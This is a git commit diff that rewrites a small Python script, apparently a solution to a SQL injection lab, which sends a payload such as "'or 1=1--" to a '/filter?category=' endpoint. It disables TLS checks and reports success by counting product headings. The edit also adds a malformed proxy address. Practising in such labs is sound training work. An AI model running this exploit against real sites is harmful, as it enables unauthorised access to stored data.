4332b0df8596b2db53721401c22cb9f87c01f65c
cyb3ritic <cyb3ritic@gmail.com>
2024-05-09 13:17:21 +0530

    edit lab1 python source code

--- SQLi/SQLI_lab_01.py
+++ SQLi/SQLI_lab_01.py
@@ -1,34 +1,40 @@
 #SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
-import requests
-import sys
-import urllib3
+import sys, urllib3, requests
 from bs4 import BeautifulSoup as bs
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
-proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}
-
-def exploit_SQLi(url,payload):
-    uri = '/filter?category='
-    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
-    print(r.text)
-    soup = bs(r.text)
-    if len(soup.find_all('h3')) > 12:
+def exploit_sqli(url,payload):
+    uri = "/filter?category="
+    proxies = {'http' : 'http://127.0.0.0/:8080', 'https' : 'http://127.0.0.1:8080'}
+    r = requests.get(url + uri + payload, verify = False, proxies=proxies)
+    soup = bs(r.text,features="lxml")
+    if(len(soup.find_all('h3')) > 12):
         return True
     else:
         return False
 
 if __name__ == '__main__':
     try:
+        
         url = sys.argv[1].strip()
         payload = sys.argv[2].strip()
-    except IndexError:
-        print("[-] usage: %s <url> <payload>", sys.arvg[0])
-        print("[-] example: %s www.example.com '1=1'", sys.argv[0])
-        sys.exit(-1)
         
-if exploit_SQLi(url,payload):
-    print("[+] " + '\033[32m' +  "SQL injection attack successful" + '\033[0m')
-else:
-    print("[+] " + '\033[31m' +  "SQL injection attack unsuccessful" + '\033[0m')
+        
+    except:
+        print(
+        f'''\t---------------------------------------------------------------
+            Getting trouble??
+            Here is how you can run this exploit!
+
+            [-] usage:      python3 {sys.argv[0]} <url> <payload>
+            [-] example:    python3 {sys.argv[0]} www.example.com "'or 1=1--"
+        ---------------------------------------------------------------
+            ''')
+        exit(-1)
     
+    
+if(exploit_sqli(url,payload)):
+    print("[+]" '\033[32m' + "SQL injection attack successful" + '\033[0m')
+else:
+    print("[+]" + '\033[31m' + "SQL injection attack unsuccessful" + '\033[0m')
